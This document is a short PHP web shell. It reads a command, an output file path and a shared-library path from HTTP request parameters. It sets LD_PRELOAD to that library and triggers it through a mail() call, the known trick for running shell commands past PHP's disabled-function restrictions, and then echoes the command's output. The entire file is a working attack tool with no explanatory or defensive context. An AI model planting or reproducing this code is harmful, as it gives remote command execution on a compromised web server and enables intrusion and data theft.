<?php
$cmd = $_REQUEST["cmd"];
$out_path = $_REQUEST["outpath"];
$evil_cmdline = $cmd." > ".$out_path." 2>&1";
echo "<br /><b>cmdline: </b>".$evil_cmdline;
putenv("EVIL_CMDLINE=".$evil_cmdline);

$so_path = $_REQUEST["sopath"];
putenv("LD_PRELOAD=".$so_path);
mail("", "", "", "");

echo "<br /><b>output: </b><br />".nl2br(file_get_contents($out_path));
?>